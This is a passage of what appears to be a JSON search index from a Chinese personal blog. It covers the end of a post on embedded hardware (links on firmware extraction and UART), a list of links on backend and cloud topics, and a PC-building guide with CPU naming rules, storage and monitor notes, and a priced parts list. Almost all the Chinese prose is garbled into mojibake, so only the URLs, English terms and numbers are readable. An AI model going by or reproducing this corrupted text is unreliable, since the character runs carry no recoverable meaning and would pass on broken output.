http://res.kingst.site/kfs/doc/Kingst%e9%87%91%e6%80%9d%e7%89%b9%e8%99%9a%e6%8b%9f%e4%bb%aa%e5%99%a8%e4%bd%bf%e7%94%a8%e6%89%8b%e5%86%8c.pdf å§¿åŠ¿ å›ºä»¶æå– https://www.anquanke.com/post/id/227285 ç¡¬ä»¶è°ƒè¯• https://www.riverloopsecurity.com/blog/2020/01/hw-101-uart/ ","date":"2022-07-08T14:11:35+08:00","image":"https://pic1.zhimg.com/v2-983af8971091bf560af2e2299d801cd1_1440w.jpg","permalink":"https://cerr.cc/post/zkv%E5%AF%B9%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%A1%AC%E4%BB%B6%E7%9A%84%E6%B5%85%E5%B0%9D%E4%B8%8D%E6%AD%A2/","title":"ZKVå¯¹åµŒå…¥å¼ç¡¬ä»¶çš„æµ…å°ä¸æ­¢"},{"content":"TODOï¼š\noauth https://oauth.net/ s3-pika restful https://restfulapi.net/ æ¦‚å¿µ æ€»è§ˆ https://www.redhat.com/zh/topics äº‘åŸç”Ÿ https://www.redhat.com/zh/topics/cloud-native-apps åˆ†å¸ƒå¼ CAPç†è®º åœ¨è®¡ç®—æœºç§‘å­¦ä¸­, CAPå®šç†ï¼ˆCAP theoremï¼‰, åˆè¢«ç§°ä½œ å¸ƒé²å°”å®šç†ï¼ˆBrewer\u0026rsquo;s theoremï¼‰, å®ƒæŒ‡å‡ºå¯¹äºä¸€ä¸ªåˆ†å¸ƒå¼è®¡ç®—ç³»ç»Ÿæ¥è¯´ï¼Œä¸å¯èƒ½åŒæ—¶æ»¡è¶³ä»¥ä¸‹ä¸‰ç‚¹:\nä¸€è‡´æ€§(Consistency) (æ‰€æœ‰èŠ‚ç‚¹åœ¨åŒä¸€æ—¶é—´å…·æœ‰ç›¸åŒçš„æ•°æ®) å¯ç”¨æ€§(Availability) (ä¿è¯æ¯ä¸ªè¯·æ±‚ä¸ç®¡æˆåŠŸæˆ–è€…å¤±è´¥éƒ½æœ‰å“åº”) åˆ†éš”å®¹å¿(Partition tolerance) (ç³»ç»Ÿä¸­ä»»æ„ä¿¡æ¯çš„ä¸¢å¤±æˆ–å¤±è´¥ä¸ä¼šå½±å“ç³»ç»Ÿçš„ç»§ç»­è¿ä½œ) CAPç†è®ºçš„æ ¸å¿ƒæ˜¯ï¼šä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿä¸å¯èƒ½åŒæ—¶å¾ˆå¥½çš„æ»¡è¶³ä¸€è‡´æ€§ï¼Œå¯ç”¨æ€§å’Œåˆ†åŒºå®¹é”™æ€§è¿™ä¸‰ä¸ªéœ€æ±‚ï¼Œæœ€å¤šåªèƒ½åŒæ—¶è¾ƒå¥½çš„æ»¡è¶³ä¸¤ä¸ªã€‚\nå› æ­¤ï¼Œæ ¹æ® CAP åŸç†å°† NoSQL æ•°æ®åº“åˆ†æˆäº†æ»¡è¶³ CA åŸåˆ™ã€æ»¡è¶³ CP åŸåˆ™å’Œæ»¡è¶³ AP åŸåˆ™ä¸‰ å¤§ç±»ï¼š\nCA - å•ç‚¹é›†ç¾¤ï¼Œæ»¡è¶³ä¸€è‡´æ€§ï¼Œå¯ç”¨æ€§çš„ç³»ç»Ÿï¼Œé€šå¸¸åœ¨å¯æ‰©å±•æ€§ä¸Šä¸å¤ªå¼ºå¤§ã€‚ CP - æ»¡è¶³ä¸€è‡´æ€§ï¼Œåˆ†åŒºå®¹å¿æ€§çš„ç³»ç»Ÿï¼Œé€šå¸¸æ€§èƒ½ä¸æ˜¯ç‰¹åˆ«é«˜ã€‚ AP - æ»¡è¶³å¯ç”¨æ€§ï¼Œåˆ†åŒºå®¹å¿æ€§çš„ç³»ç»Ÿï¼Œé€šå¸¸å¯èƒ½å¯¹ä¸€è‡´æ€§è¦æ±‚ä½ä¸€äº›ã€‚ ç¼–ç  Goè¯­è¨€ å®˜ç½‘ï¼šhttps://go.dev/\nè¯­æ³•ï¼šhttps://go.dev/ref/spec\nè®¡ç®— æŠ€æœ¯ LVS https://cloud.tencent.com/developer/article/1657962 https://my.oschina.net/leeypp1/blog/294807?fromerr=xfCehUJY äº§å“ CentOS referenceï¼š\nhttps://en.wikipedia.org/wiki/CentOS https://zhuanlan.zhihu.com/p/337075432 Docker dockerfile https://docs.docker.com/engine/reference/builder/ https://www.runoob.com/docker/docker-dockerfile.html compose https://docs.docker.com/compose/ https://www.runoob.com/docker/docker-compose.html swarm https://docs.docker.com/engine/swarm/ https://www.runoob.com/docker/docker-swarm.html K8s Kubernetes, also known as K8s, is an open-source system for automating deployment, scaling, and management of containerized applications.\nhttps://kubernetes.io/ https://kubernetes.io/docs/concepts/overview/what-is-kubernetes/ https://www.redhat.com/zh/topics/containers/what-is-kubernetes å­˜å‚¨ æŠ€æœ¯ SQL https://en.wikipedia.org/wiki/SQL\nRAID referenceï¼š\nhttps://zh.wikipedia.org/zh-tw/RAID XFS referenceï¼š\nhttps://zh.wikipedia.org/zh-tw/XFS NoSQL https://www.runoob.com/mongodb/nosql.html äº§å“ Amazon S3 å®˜ç½‘ï¼šhttps://aws.amazon.com/cn/s3/\nAmazon Simple Storage Service (Amazon S3) æ˜¯ä¸€ç§å¯¹è±¡å­˜å‚¨æœåŠ¡\nReference:\nhttps://zhuanlan.zhihu.com/p/269794747 MongoDB https://www.runoob.com/mongodb/mongodb-tutorial.html elasticsearch https://www.elastic.co/cn/\nhttps://github.com/elastic/elasticsearch https://www.elastic.co/cn/elasticsearch/ Kibana https://www.elastic.co/cn/kibana/\nRedis https://redis.io/docs/about/ https://www.runoob.com/redis/redis-tutorial.html ç®¡ç† äº§å“ Apache Hadoop https://hadoop.apache.org/ https://www.runoob.com/w3cnote/hadoop-tutorial.html Apache Zookeeper https://www.runoob.com/w3cnote/zookeeper-tutorial.html Apache Kafka https://www.redhat.com/zh/topics/integration/what-is-apache-kafka Jenkins https://www.jenkins.io/ https://www.liaoxuefeng.com/article/1083282007018592 ","date":"2022-07-04T17:47:35+08:00","image":"https://pic4.zhimg.com/v2-3ec9f9b98b4c3596e09b40d143410f0e_1440w.jpg?source=172ae18b","permalink":"https://cerr.cc/post/zkv%E5%AF%B9%E5%90%8E%E7%AB%AF%E7%9A%84%E6%B5%85%E5%B0%9D%E8%BE%84%E6%AD%A2/","title":"ZKVå¯¹åç«¯çš„æµ…å°è¾„æ­¢"},{"content":"å‰ä¼  ä¸åŒå¯»å¸¸çš„æ˜¯ï¼Œæˆ‘æ˜¯åœ¨å°†å„ç§è®¾å¤‡éƒ½ç©è¿‡ä¸€è½®åï¼Œæœ€åæ‰å°†ç›®å…‰æ”¾åˆ°äº†å°å¼æœºä¸Šã€‚æƒ³æ¥åŸå› åº”å½“åœ¨äºæˆ‘æ˜¯ä¸€ä¸ªæ— å¯æ•‘è¯çš„MINIæ•™ä¿¡å¾’â€”â€”iPhoneç”¨miniï¼›iPadç”¨miniï¼ˆæ›¾ç»ï¼Œå¥ˆä½•M1å¤ªé¦™äº†ï¼‰ï¼›Macbookç”¨miniAirï¼›å°å¼æœºç”¨NUC+ç”µè„‘æ£’+å•ç‰‡æœºâ€¦â€¦\nå¥½å§ï¼Œå…¶å®æˆ‘ä¹Ÿä¸èƒ½è¯´æ²¡æœ‰å°å¼æœºï¼Œæ¯•ç«ŸNUCä¹Ÿç®—å¾—ä¸Šã€‚ä½†åœ¨æŠŠå„ç±»å°å‹è®¾å¤‡éƒ½æŠ˜è…¾è¿‡ä¸€éåï¼Œæˆ‘é™·å…¥äº†èŒ«ç„¶å››é¡¾æ— æ‰€å¯„æ‰˜çš„æ‚²æƒ¨å¢ƒåœ°ã€‚çªç„¶æƒ³èµ·è‡ªå·±è¿™å‡ å¹´æ¥ç«Ÿæœªå°è¿›å…¥DIY PCçš„æµ·æ´‹è¯•è¯•æ°´ã€‚åˆç¥äº†ç¥æ‰‹ä¸Šè¿™å°NUC11PAHi5ï¼Œä¼°æ‘¸ç€è¿™å­©å­ä¹Ÿæ˜¯å¤©èµ„å¹³å¹³ã€å‰é€”é»¯æ·¡ï¼Œç«­å°½å…¨åŠ›åœ°è¿è¡ŒOW1å´åªæ˜¯å‡‘æ´»èƒ½ç©ï¼Œç»æ— èƒ½å¸¦èµ·OW2çš„å¤©èµ‹ã€‚æ°é€¢æœ¬ä¸–ä»£å…¨çƒå¤§è§æ¡ä¹‹å§‹ï¼ŒåŠ å¯†è´§å¸å¸‚åœºä¸€æ³»åƒé‡Œï¼Œéš¾çª¥å…¶åº•ã€‚æ˜¾å¡ä»·æ ¼ä¹Ÿæ˜¯åº”å£°è€Œè½ï¼Œä¼—æœ›æ‰€å½’ã€‚å¤©æ—¶åœ°åˆ©äººå’Œâ€”â€”è¿™é’±ï¼Œæˆ‘ä¸å¾—ä¸èŠ±ã€‚æ¯•ç«Ÿå¤©æ„ä¸å¯è¿ã€‚\nä½†å¯¹äºæ‘å„¿é‡Œé•¿å¤§çš„æˆ‘æ¥è¯´ï¼Œæå‡ºå»çš„é’±å€˜è‹¥æ²¡èƒ½æ¢æ¥è¶³é‡çš„å¿«ä¹ï¼Œä¹ƒè‡³ä¹°æ¥çš„æ˜¯ç³Ÿå¿ƒï¼Œå®åœ¨æ˜¯å¤§é€†ä¸é“æœ‰è¿ç¥–è®­çš„äº‹æƒ…ã€‚å…¶è´Ÿç½ªæ„Ÿç”šè‡³è¦ç”šäºå€’æ‰æ²¡åƒå®Œçš„è‚‰ï¼ˆæˆ–è®¸æ­£å› å¦‚æ­¤æˆ‘æ‰æœ‰å¹¸æˆä¸ºé—²é±¼å¤§Vï¼Œç„‰çŸ¥éç¦å•Šï¼‰ã€‚æ‰€ä»¥ï¼Œäº‹å‰è¿›è¡Œå…¨æ–¹ä½çš„è€ƒå¯Ÿä¸è°ƒç ”æ˜¯ååˆ†å¿…è¦çš„äº‹æƒ…ã€‚\né€šç”¨èµ„æº https://www.zhihu.com/special/1436041011885293568?tab=1436061145295228928 ä¸€äº›æ’è¡Œæ¦œå’Œå¤©æ¢¯å›¾ï¼šhttps://rank.kkj.cn/dgpu3.shtml ä¸‡ç‰©çš†å¯å¯¹æ¯”ï¼šhttps://versus.com/cn CPU é€šç”¨èµ„æº å¯ä»¥äºè¿™äº›ç½‘ç«™æŸ¥è¯¢åˆ°ç»å¤§å¤šæ•°CPUçš„benchmarkï¼š\nhttps://www.cpubenchmark.net/ https://browser.geekbench.com/processor-benchmarks å¤©æ¢¯å›¾ï¼šhttps://www.mydrivers.com/zhuanti/tianti/cpu/index.html\nIntel å‘½åè§„åˆ™ é…·ç¿åç¼€å åç¼€ å«ä¹‰ G1-G7 æ˜¾å¡çº§åˆ«ï¼ˆä»…é€‚ç”¨äºé‡‡ç”¨å…¨æ–°é›†æˆæ˜¾å¡æŠ€æœ¯çš„å¤„ç†å™¨ï¼‰ E åµŒå…¥å¼ F éœ€è¦ç‹¬ç«‹æ˜¾å¡ G å°è£…åŒ…ä¸­åŒ…å«ç‹¬ç«‹æ˜¾å¡ H é’ˆå¯¹ç§»åŠ¨è®¾å¤‡è¿›è¡Œä¼˜åŒ–çš„é«˜æ€§èƒ½ HK é’ˆå¯¹ç§»åŠ¨è®¾å¤‡è¿›è¡Œä¼˜åŒ–çš„é«˜æ€§èƒ½ï¼Œæœªé”é¢‘ HQ é’ˆå¯¹ç§»åŠ¨è®¾å¤‡è¿›è¡Œä¼˜åŒ–çš„é«˜æ€§èƒ½ï¼Œå››æ ¸ K æœªé”é¢‘ S ç‰¹åˆ«ç‰ˆ T ç»è¿‡åŠŸè€—ä¼˜åŒ–çš„ç”Ÿæ´»æ–¹å¼ U é«˜èƒ½æ•ˆç§»åŠ¨è®¾å¤‡ Y æä½åŠŸè€—çš„ç§»åŠ¨è®¾å¤‡ X/XE æœªé”é¢‘ï¼Œé«˜ç«¯ B çƒæ …é˜µåˆ— (BGA) referenceï¼šhttps://www.intel.com/content/www/us/en/processors/processor-numbers.html\nAMD å‘½åè§„åˆ™ é”é¾™åç¼€å Xåç¼€\nAMD Ryzen Xç³»åˆ—è·ŸIntelçš„Kç³»åˆ—ç±»ä¼¼ï¼Œéƒ½æ˜¯å¼ºåŒ–äº†è¶…é¢‘ç‰¹æ€§ã€‚ Kåç¼€\nKä»£è¡¨è§£é”å€é¢‘ï¼Œå¯ä»¥è¶…é¢‘ï¼Œå¦‚AMD Athlon X4 860Kå’ŒAMD A10-7870Kã€‚ G\nEåç¼€\nEåç¼€ç‰¹æŒ‡FXç³»åˆ—CPUçš„èŠ‚èƒ½ç‰ˆï¼Œå¦‚FX 8370Eçš„é¢‘ç‡é™ä½åˆ°3.3-4.3GHzï¼ŒåŠŸè€—é™ä½åˆ°95Wï¼ˆFX8370çš„è§„æ ¼ä¸º4.0-4.3GHzï¼Œ125Wï¼‰ã€‚ Båç¼€\nBåç¼€ç‰¹æŒ‡APUçš„ä½åŠŸè€—å•†åŠ¡ç‰ˆæœ¬ï¼Œæ¯”å¦‚A10 PRO-7850Bï¼Œä¸‹é™èƒ½è€—å°‘10Wï¼ŒGPUé¢‘ç‡é™ä½ã€‚ Måç¼€\nMç³»åˆ—ç‰¹æŒ‡APUçš„ç§»åŠ¨ç‰ˆã€‚ æ˜¾å¡ å¤©æ¢¯å›¾ï¼šhttps://www.mydrivers.com/zhuanti/tianti/gpu/index.html\næ—¶æ—¶åˆ»åˆ»ï¼Œå½“å¿ƒçŸ¿å¡ï¼å†™äºè£…æœºå®Œæ¯•åï¼š\nå‡ºäºå¯¹ä¹°åˆ°çŸ¿å¡çš„æ‹…å¿§ï¼Œæˆ‘æœ€ç»ˆäºåŒäº‹æ‰‹ä¸­è´­å…¥äº†ä»–çš„RX5500XTâ€”â€”ä¸€æ¬¾å£ç¢‘å¹¶ä¸ç®—ä½³çš„ä¸­ä½ç«¯æ˜¾å¡ã€‚æƒ³æ¥å¤§ä¸äº†ç­‰ä¸‹ä¸€ä»£æ˜¾å¡å‘å”®åï¼Œæˆ–æ˜¯çœŸæœ‰æ›´é«˜çš„æµ®ç‚¹è¿ç®—éœ€æ±‚åï¼Œå†å‡çº§ä¹Ÿä¸è¿Ÿã€‚\nç„¶è€Œç»è¿‡å®é™…æ¸¸æˆæµ‹è¯•ï¼Œæˆ‘å‘ç°è¿™æ¬¾æ˜¾å¡ä¸ºæˆ‘çš„æ¸£æ¸£75Hz 1080Pæ˜¾ç¤ºå™¨è¾“å‡ºè§†é¢‘ä¿¡å·ï¼Œç®€ç›´åº”ä»˜è‡ªå¦‚ã€‚ç¥ä¼˜åŒ–çš„åœ°å¹³çº¿4æ»¡å¸§ç‡æ»¡ç”»è´¨ä¸‹ï¼Œæ˜¾å¡å ç”¨åªæœ‰70%å‡ºå¤´ï¼›è’é‡å¤§é•–å®¢2é»˜è®¤é«˜ç”»è´¨æ˜¾å¡è™½æ»¡è½½ï¼Œä½†ä¹Ÿæ˜¯æ»¡å¸§æµç•…ï¼›è‡³äºæ˜¾å¡æ€æ‰‹Cyberpunk2077ï¼Œé«˜ç”»è´¨ä¹Ÿèƒ½æµç•…ã€‚æœç„¶åªè¦éœ€æ±‚æ˜¯1080Pä¸‹ç©3Aï¼Œä¸‰ä½æ•°çš„ä¸­ä½ç«¯æ˜¾å¡å³å¯èƒœä»»ã€‚\nç¡¬ç›˜ å›ºæ€ç¡¬ç›˜ å›ºæ€ç¡¬ç›˜ä½¿ç”¨NANDé—ªå­˜é¢—ç²’ä½œä¸ºå­˜å‚¨çš„ä¸»ä½“ï¼Œé‡‡ç”¨ä¸»æ§+å¤šé¢—é—ªå­˜èŠ¯ç‰‡çš„ç»“æ„ã€‚\nNANDé—ªå­˜é¢—ç²’ ä¸»è¦åˆ†ä¸ºSLCã€MLCã€TLCã€QLCå››ç§ã€‚å¯¿å‘½å’Œä»·æ ¼éƒ½ä¾æ¬¡é€’å‡ã€‚\nreferenceï¼šhttps://www.kingston.com/cn/blog/pc-performance/difference-between-slc-mlc-tlc-3d-nand\næ¥å£ä¸åè®® ç‰©ç†æ¥å£ M.2 U.2 AIC NGFF é«˜é€Ÿä¿¡å·åè®® SATA Serial Advanced Technology Attachment PCIe Peripheral Component Interconnect Express SAS Serial Attached SCSI ä¼ è¾“å±‚åè®® NVMe ä¸“ä¸ºå›ºæ€ç¡¬ç›˜è®¾è®¡çš„åè®®ï¼Œä¸ºNANDåšäº†ä¼˜åŒ– SCSI ATA ä»…ä¸SATAé…åˆ referenceï¼š\näº†è§£ SSD æŠ€æœ¯ï¼šNVMeã€SATAã€M.2ï¼šhttps://www.kingston.com/cn/community/articledetail/articleid/48543 å›ºæ€ç¡¬ç›˜å¤–å½¢å°ºå¯¸ç±»å‹ï¼šhttps://www.kingston.com/cn/blog/pc-performance/ssd-form-factors M.2 å›ºæ€ç¡¬ç›˜çš„ä¸¤ç§ç±»å‹ï¼šSATA å’Œ NVMeï¼šhttps://www.kingston.com/cn/blog/pc-performance/two-types-m2-vs-ssd æœºæ¢°ç¡¬ç›˜ å­˜å‚¨æŠ€æœ¯åˆ†ä¸º PMR(CMR) ä¸ SMRï¼Œå‚è€ƒå¦‚ä¸‹ï¼š\nhttps://kb.synology.cn/zh-cn/DSM/tutorial/PMR_SMR_hard_disk_drives https://zhuanlan.zhihu.com/p/353963603 å°ºå¯¸åˆ†ä¸º3.5è‹±å¯¸ä¸2.5è‹±å¯¸ã€‚æ•°å­—è™½ç›¸å·®ä¸å¤§ï¼Œå®é™…ä½“ç§¯å´ç›¸å»ç”šè¿œã€‚\nä¸ªäººæ–¹æ¡ˆ æˆ‘çš„æ–¹æ¡ˆæ˜¯ï¼š\nå•ä¸ªæ’åˆ°ä¸»æ¿M.2å£çš„NVMe 1TB SSDåšç³»ç»Ÿç›˜ï¼Œå•ç‹¬åˆ†åŒºä¸ºCç›˜ã€‚è¯»é€Ÿåœ¨2.8GB/så·¦å³ã€‚ ä¸€ä¸ªSMR 6TB 3.5å¯¸ SATA HDDåšå†·æ•°æ®å­˜å‚¨ã€‚è¯»é€Ÿåœ¨150MB/så·¦å³ã€‚ ä¸€ä¸ªPMR 1TB 2.5å¯¸ SATA HDDåšçƒ­æ•°æ®ã€FTPã€BTæ•°æ®å­˜å‚¨ã€‚è¯»é€Ÿåœ¨150MB/så·¦å³ã€‚ ä¸€ä¸ªMLC USB SCSI 128GBå›ºæ€Uç›˜åšç§»åŠ¨æ•°æ®å­˜å‚¨ã€‚è¯»é€Ÿåœ¨450MB/så·¦å³ã€‚ ä¸»æ¿ å…ˆæ¥äº†è§£ä¸‹PCIeã€‚çŸ¥ä¹è€ç‹¼çš„æ–‡ç« éƒ½å†™çš„å¾ˆå¥½å“‡ï¼Œæ¨èä»–çš„UEFIä¸BIOSæ¢ç§˜ã€‚\næ·±å…¥PCIä¸PCIeä¹‹ä¸€ï¼šç¡¬ä»¶ç¯‡ï¼šhttps://zhuanlan.zhihu.com/p/26172972 æ·±å…¥PCIä¸PCIeä¹‹äºŒï¼šè½¯ä»¶ç¯‡ï¼šhttps://zhuanlan.zhihu.com/p/26244141 PCIeä¸­æ–­æœºåˆ¶(1):æ¼”å˜å†å²ï¼šhttps://zhuanlan.zhihu.com/p/399239928 å¤§å°åˆ†ç±» å¤§æ¿ï¼šATXã€Mini ATXã€XL-ATXã€éæ ‡å‡†E-ATX å°æ¿ï¼šMATXã€Î¼ATXã€FlexATX è¿·ä½ æ¿ï¼šITXï¼ˆåŒ…æ‹¬Thin-ITXï¼‰ è¶…å¤§æ¿ï¼šæ ‡å‡†E-ATXã€EE-ATXã€HPTXã€WTX åç¡•ä¸»æ¿äº§å“çº¿ï¼š\né¡¶å°–æ——èˆ° ROG æ¸¸æˆä¸»æµ STRIX å…¥é—¨ç”µç« TUF GAMING ä¸ PRIME referenceï¼š\nhttps://www.zhihu.com/question/351825113/answer/1041320836 https://zhuanlan.zhihu.com/p/53379889 å†…å­˜ ç¡¬ä»¶å½¢æ€ åœ¨80286æ—¶ä»£ï¼Œå†…å­˜é¢—ç²’ï¼ˆChipï¼‰æ˜¯ç›´æ¥æ’åœ¨ä¸»æ¿ä¸Šçš„ï¼Œå«åšDIP(Dual In-line Package)ã€‚åˆ°äº†80386æ—¶ä»£ï¼Œæ¢æˆ1ç‰‡ç„Šæœ‰å†…å­˜é¢—ç²’çš„ç”µè·¯æ¿ï¼Œå«åšSIMMï¼ˆSingle-Inline Memory Moduleï¼‰ã€‚ç”±é˜µè„šå½¢æ€å˜åŒ–æˆç”µè·¯æ¿å¸¦æ¥äº†å¾ˆå¤šå¥½å¤„ï¼šæ¨¡å—åŒ–ï¼Œå®‰è£…ä¾¿åˆ©ç­‰ç­‰ï¼Œç”±æ­¤DIYå¸‚åœºæ‰æœ‰å¯èƒ½äº§ç”Ÿã€‚å½“æ—¶SIMMçš„ä½å®½æ˜¯32bitï¼Œå³ä¸€ä¸ªå‘¨æœŸè¯»å–4ä¸ªå­—èŠ‚ï¼Œåˆ°äº†å¥”è…¾æ—¶ï¼Œä½å®½å˜ä¸º64bitï¼Œå³8ä¸ªå­—èŠ‚ï¼Œäºæ˜¯SIMMå°±é¡ºåŠ¿å˜ä¸ºDIMMï¼ˆDouble-Inline Memory Moduleï¼‰ã€‚è¿™ç§å½¢æ€ä¸€ç›´å»¶ç»­è‡³ä»Šï¼Œä¹Ÿæ˜¯å†…å­˜æ¡çš„åŸºæœ¬å½¢æ€ã€‚ç°åœ¨DIMMåˆ†ä¸ºå¾ˆå¤šç§ï¼š\nRDIMM: å…¨ç§°ï¼ˆRegistered DIMMï¼‰ï¼Œå¯„å­˜å‹æ¨¡ç»„ï¼Œä¸»è¦ç”¨åœ¨æœåŠ¡å™¨ä¸Šï¼Œä¸ºäº†å¢åŠ å†…å­˜çš„å®¹é‡å’Œç¨³å®šæ€§åˆ†æœ‰ECCå’Œæ— ECCä¸¤ç§ï¼Œä½†å¸‚åœºä¸Šå‡ ä¹éƒ½æ˜¯ECCçš„ã€‚ UDIMMï¼šå…¨ç§°ï¼ˆUnbuffered DIMMï¼‰ï¼Œæ— ç¼“å†²å‹æ¨¡ç»„ï¼Œè¿™æ˜¯æˆ‘ä»¬å¹³æ—¶æ‰€ç”¨åˆ°çš„æ ‡å‡†å°å¼ç”µè„‘DIMMï¼Œåˆ†æœ‰ECCå’Œæ— ECCä¸¤ç§ï¼Œä¸€èˆ¬æ˜¯æ— ECCçš„ã€‚ SO-DIMMï¼šå…¨ç§°ï¼ˆSmall Outline DIMMï¼‰ï¼Œå°å¤–å‹DIMMï¼Œç¬”è®°æœ¬ç”µè„‘ä¸­æ‰€ä½¿ç”¨çš„DIMMï¼Œåˆ†ECCå’Œæ— ECCä¸¤ç§ã€‚ Mini-DIMMï¼šDDR2æ—¶ä»£æ–°å‡ºç°çš„æ¨¡ç»„ç±»å‹ï¼Œå®ƒæ˜¯Registered DIMMçš„ç¼©å°ç‰ˆæœ¬ï¼Œç”¨äºåˆ€ç‰‡å¼æœåŠ¡å™¨ç­‰å¯¹ä½“ç§¯è¦æ±‚è‹›åˆ»çš„é«˜ç«¯é¢†åŸŸã€‚ DDR DDR SDRAM: Double Data Rate Synchronous Dynamic Random Access Memory\nreferenceï¼š\nhttps://zhuanlan.zhihu.com/p/26255460 https://en.wikipedia.org/wiki/DDR_SDRAM æ˜¾ç¤ºå™¨ äº®åº¦ï¼šè¶Šé«˜è¶Šå¥½ï¼Œ300 cd/mÂ² ä¸­ç­‰ï¼Œ400 cd/mÂ² ä¸é”™ï¼Œ 500 cd/mÂ² ä¼˜ç§€ å¯¹æ¯”åº¦ï¼šè¶Šé«˜è¶Šå¥½ï¼Œ700~900:1 åŠæ ¼ï¼Œ900~ 1100 ä¸­ç­‰ï¼Œ1100~1300ä¸é”™ï¼Œ1500 ä»¥ä¸Šå¾ˆå¥½ã€‚ è‰²åŸŸï¼šsRGB ï¼œ P3ï¼œ AdobeRGB, è¦†ç›–è¶Šå¤šé¢œè‰²è¶Šè‰³ï¼Œè¦†ç›–è¶Šç²¾å‡†è¶Šå¥½ï¼Œä½†è¦†ç›–è¶Šå¤šä¸ä¸€å®šè¶Šå¥½ã€‚ è‰²æ·±ï¼Œ6 bit åº•çº¿ï¼Œæœ‰æ˜æ˜¾å±‚æ¬¡æ„Ÿï¼Œ ä¸­ç«¯è¡¨ç°ä¸é”™ï¼Œ10bit è¡¨ç°å¾ˆå¥½ä½†éœ€è¦æ•´å¥—è®¾å¤‡æ”¯æŒã€‚ è‰²å‡†ï¼šÎ”Eï¼œ1.5 å°±èƒ½é€‚ç”¨äºä¸¥è°¨çš„å·¥ä½œï¼ŒÎ”Eï¼œ3 ä¸€èˆ¬äººçœ‹ä¸å‡ºåŒºåˆ«ï¼ŒÎ”E åœ¨ 5 ä»¥ä¸Šè‰²åä¸¥é‡ã€‚ åˆ·æ–°ç‡ï¼šè¶Šé«˜è¶Šå¥½ï¼Œæ‰“æ¸¸æˆ 120Hz å°±èƒ½æœ‰å¾ˆå¤§æå‡ï¼Œ120Hz ä¹‹ååŒºåˆ«å¹¶ä¸å¤§ï¼ˆé™¤éä½ æ˜¯èŒä¸šé€‰æ‰‹ï¼‰ å“åº”æ—¶é—´ï¼šè¶Šå¿«è¶Šå¥½ï¼Œ3ms ä»¥å†…é¡¶çº§ï¼Œ5ms ä»¥å†…ä¼˜ç§€ï¼Œ10ms ä»¥å†…ä¸­ç­‰ï¼Œ10ms ä»¥ä¸Šå®Œå…¨ä¸é€‚åˆæ¸¸æˆ referenceï¼šhttps://www.zhihu.com/question/35668312\næœºç®± MINIæœºç®± å®‰è£…ITXå’ŒM-ATXçš„æœºç®± ä¸­å¡”æœºç®± ATXä¸»æ¿çš„æœºç®± å…¨å¡”æœºç®± ä¸ºäº†E-ATXæ¿è€Œè®¾è®¡çš„ referenceï¼š\nhttps://zhuanlan.zhihu.com/p/25592446 https://www.zhihu.com/question/432376475 https://zhuanlan.zhihu.com/p/373132410 ç”µæº ä¸»è¦å‚æ•°ä¸ºæœ€å¤§ä¾›ç”µåŠŸç‡ï¼Œè®¡ç®—å¾—åˆ°æœºç®±ä¸­æ‰€æœ‰éƒ¨ä»¶æ»¡è½½åŠŸç‡éœ€å°äºç”µæºæœ€å¤§åŠŸç‡ã€‚ä¸»è¦è€—ç”µå¤§æˆ·ä¸ºæ˜¾å¡ä¸CPUï¼Œè®¡ç®—å¾—å¤§è‡´æ€»åŠŸç‡å€¼å³å¯ã€‚\næ•£çƒ­ æ°´å†· VS é£å†·ï¼Œè€ç”Ÿå¸¸è°ˆã€‚ä½†æˆ‘çš„è¿™å¥—é…ç½®å®åœ¨å‡‰æ„åè¶³ï¼Œå»‰ä»·é£å†·å®Œå…¨è¶³çŸ£ã€‚åœ¨å¦‚ä¸‹é£å†·é…ç½®ä¸‹æ„å»ºä¸€ä¸ªå¹¶ä¸ç®—å¾ˆç•…é€šçš„ç›´è§’é£é“ï¼Œæ—¥å¸¸è´Ÿè½½ä¸‹é™éŸ³æ¨¡å¼CPUç¨³å®š50Â°Cå·¦å³ï¼Œé£æ‰‡æ•£çƒ­æ¨¡å¼ä¸‹èƒ½æ¥åˆ°30Â°Cã€‚ä½†æ•£çƒ­ä¸ä»…ä»…æ˜¯æ•£çƒ­å™¨çš„è´£ä»»ï¼Œé€šé£è‰¯å¥½çš„æœºç®±å¤–åŠ æ°å½“çš„é£é“è®¾è®¡åŒæ ·ä¸å®¹å¿½è§†ã€‚æ‰€ä»¥æŒ‘é€‰æœºç®±å’Œé£æ‰‡æ—¶ï¼Œä¹Ÿè¦æ³¨æ„æœ€åä¸èƒ½ç»„æˆäº†ä¸€å°é—·ç½ã€‚\nç»ˆå±€ æ€»ä»· Â¥ 5663 CPU AMD é”é¾™ R5-5600X ç›’è£… Â¥ 940ï¼ˆå…¨æ–°ï¼‰ https://www.amd.com/en/products/cpu/amd-ryzen-5-5600x ä¸»æ¿ åç¡• TUF GAMING B550M-PLUS WIFI Â¥ 600ï¼ˆå…¨æ–°ï¼‰ https://www.asus.com.cn/Motherboards-Components/Motherboards/TUF-Gaming/TUF-GAMING-B550M-PLUS-WI-FI/ æœºç®± ä¹”æ€ä¼¯ D30 M-ATX é“¶è‰² Â¥ 399ï¼ˆå…¨æ–°ï¼‰ https://www.jonsbo.com/products/D30.html æ˜¾å¡ è¿ªå…° RX5500XT 8G Xæˆ˜å°† Â¥ 925ï¼ˆæ¥è‡ªåŒäº‹çš„äºŒæ‰‹ï¼‰ http://www.dataland.com.cn/prod_view.aspx?nid=3\u0026amp;typeid=129\u0026amp;id=928 å†…å­˜ é‡‘å£«é¡¿ FURY Beast 8GB DDR4 3200MHz Ã— 4 Â¥ 798ï¼ˆå…¨æ–°ï¼‰ https://www.kingston.com/cn/memory/gaming/kingston-fury-beast-ddr4-rgb-memory SSD è‹±ç¿è¾¾ é•å…‰ P5 1TB Â¥ 500ï¼ˆNUCæ›¿æ¢ä¸‹æ¥çš„ï¼‰ https://www.crucial.com/products/ssd/crucial-p5-ssd HDD å¸Œæ·é…·é±¼ST6000DM003 3.5è‹±å¯¸ 256MBç¼“å­˜ SMR 6TB Â¥ 765ï¼ˆå…¨æ–°ï¼‰ https://www.seagate.com/www-content/datasheets/pdfs/3-5-barracudaDS1900-11-1806US-en_US.pdf æ—¥ç«‹ 5400è½¬ 2.5è‹±å¯¸ 7mm 32MBç¼“å­˜ PMR 1TB Â¥ 275ï¼ˆå…¨æ–°ï¼‰ https://m.tb.cn/h.fwlHZFV?tk=4Fdi2MtXCRw ç”µæº æŒ¯å å†°å±±é‡‘è¶ 550W Â¥ 262ï¼ˆé—²é±¼äºŒæ‰‹åœ¨ä¿ï¼‰ æ•£çƒ­ åˆ©æ°‘ AS120PLUS Â¥ 139ï¼ˆå…¨æ–°ï¼‰ 